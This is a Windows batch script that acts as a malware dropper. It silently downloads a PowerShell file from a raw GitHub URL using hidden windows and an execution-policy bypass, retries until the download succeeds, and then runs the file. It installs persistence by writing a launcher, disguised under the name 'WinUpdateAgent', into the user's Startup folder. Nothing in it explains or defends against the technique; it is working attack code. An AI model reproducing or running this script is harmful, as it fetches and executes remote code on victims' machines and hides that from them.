@echo off


set "payload=https://raw.githubusercontent.com/phanquannpx18-droid/dataa/refs/heads/main/out.ps1"
set "startup_key=WinUpdateAgent"
set "download_dir=%public%"
set "pl_filename=pl.ps1"
set "mun_filename=a1.ps1"

if not exist "%download_dir%" mkdir "%download_dir%" >nul 2>&1


:download

powershell -Windowstyle Hidden -NoP -NonI -Exec Bypass -C "$wc=New-Object Net.WebClient;try{$wc.DownloadFile('%payload%','%download_dir%\pl.ps1')}catch{}"


if not exist "%download_dir%\pl.ps1" goto download


powershell -Windowstyle Hidden -NoP -NonI -Exec Bypass -C "& { function Invoke-Script { param([string]$Path) if(Test-Path $Path){ try { . $Path } catch { Write-Host ('Error in ' + $Path) -ForegroundColor Red } } }; Invoke-Script '%download_dir%\pl.ps1' }"


rem --- Persistence Setup ---


rem 2. Add Payload to Startup Folder
rem Define Startup Folder path
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Create a lightweight launcher in the Startup folder to run the payload
set "launcher_path=%startup_folder%\WinUpdateAgent_Launcher.bat"

(
    echo @echo off
    echo powershell -Windowstyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%download_dir%\%pl_filename%"
) > "%launcher_path%"

endlocal